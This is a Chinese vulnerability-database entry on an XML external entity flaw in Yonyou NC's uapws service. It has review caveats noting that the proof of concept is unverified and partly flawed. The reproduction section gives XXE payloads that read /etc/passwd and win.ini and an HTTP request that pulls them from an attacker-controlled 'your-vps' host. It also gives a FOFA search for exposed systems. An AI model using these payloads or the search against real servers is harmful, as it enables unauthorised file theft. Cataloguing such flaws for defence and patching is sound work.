---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "用友NC uapws xsd外部XML XXE"
product: "用友NC"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；出网/XML解析设置"
prerequisites: "声明未认证但Cookie示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/%E7%94%A8%E5%8F%8B%20NC%20XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"用友-UFIDA-NC\""
id: "vw-263af5c572f3f2d1a25721d2"
entity_id: "ve-263af5c572f3f2d1a25721d2"
schema_version: "1"
---

# 用友NC uapws xsd外部XML XXE

## 条目说明

- 对象与具体问题：用友NC；uapws xsd外部XML XXE
- 版本、配置及部署条件：版本未知；出网/XML解析设置
- 认证与权限前提：声明未认证但Cookie示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 多接口声明引用漏洞接口.txt却正文无附件或内容，不能泛化
- HTTP路径内**Markdown强调会污染复制请求，XML也未围栏
- 外部XML取回不等任意本地文件泄漏，缺实际回显渠道/响应
- Host121.0.0.1并非loopback应占位；在野/修复声明无证

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

用友 NC 多处接口存在XML实体注入漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## 影响范围

用友 NC

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

## 漏洞复现

python起http服务建立对应系统的xml

http://your-vps:8000/linux.xml

windows:
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///c://windows/win.ini">]><user><username>&name;</username><password>1</password></user>

linux:
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///etc/passwd">]><user><username>&name;</username><password>1</password></user>


FOFA：app="用友-UFIDA-NC"

POC/EXP：

```http
GET /uapws/service/**nc.itf.ses.DataPowerService**?xsd=http://your-vps:8000/linux.xml HTTP/1.1
Host: 121.0.0.1:55555
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=0***********************************4
Connection: close
```

POC/EXP中加粗部分可替换 漏洞接口.txt 中其他接口


## 修复方案

**官方修复：**

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
